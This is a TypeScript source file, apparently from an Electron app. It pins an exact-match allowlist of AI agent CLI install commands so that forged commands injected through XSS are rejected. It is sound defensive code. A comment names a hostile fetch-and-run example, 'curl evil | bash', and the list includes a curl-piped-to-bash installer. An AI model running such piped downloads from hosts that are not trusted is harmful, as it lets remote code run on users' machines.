// ──────────────────────────────────────────────────────────
// Canonical agent CLI install commands (single source of truth)
// ──────────────────────────────────────────────────────────
//
// These are the BUNDLED, trusted install one-liners shown in the providers
// panel. They are also the EXACT-MATCH allowlist enforced by Electron-main's
// `open_install_terminal` (electron/ipc/commands/shell.ts): the renderer hands
// a command string up to be run in Terminal.app, and main only runs it if it is
// one of these. That closes H2 — the character allowlist alone can't help,
// because a legit installer is itself `curl … | bash`, so an XSS could forge a
// `curl evil | bash` that passes the character check. Pinning to this set means
// a forged command is rejected.
//
// Keep this in sync with src/engine/agents/registry.ts (which imports it).
// ──────────────────────────────────────────────────────────

export const AGENT_INSTALL_COMMANDS = {
  claude: "npm install -g @anthropic-ai/claude-code",
  codex: "npm install -g @openai/codex",
  cursor: "curl https://cursor.com/install -sSf | bash",
} as const;

const INSTALL_COMMAND_SET = new Set<string>(Object.values(AGENT_INSTALL_COMMANDS));

/** True when `cmd` is exactly one of the bundled, trusted install commands. */
export function isKnownInstallCommand(cmd: string): boolean {
  return INSTALL_COMMAND_SET.has(cmd);
}
